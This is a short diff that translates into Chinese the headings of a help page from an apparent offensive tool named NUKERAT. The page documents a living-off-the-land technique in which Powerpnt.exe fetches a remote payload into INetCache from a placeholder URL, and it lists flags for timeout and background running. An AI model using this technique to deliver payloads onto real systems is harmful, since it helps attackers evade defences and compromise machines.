@@ -1,16 +1,16 @@
-ABOUT
+关于
     Microsoft Office binary. LOLBAS documents remote payload download
     into INetCache.
 
-USAGE:
+用法：
     Powerpnt.exe {REMOTEURL}
 
-EXAMPLES:
+示例：
     Powerpnt.exe {REMOTEURL}
 
-NUKERAT FLAGS:
-    -w <seconds>    Maximum wait time until timeout
-    -bg             Fork and run without waiting for output
+NUKERAT 选项：
+    -w <秒数>       等待超时的最大时间
+    -bg             后台运行，不等待输出
 
-    Example:
+    示例：
     Powerpnt.exe {REMOTEURL}
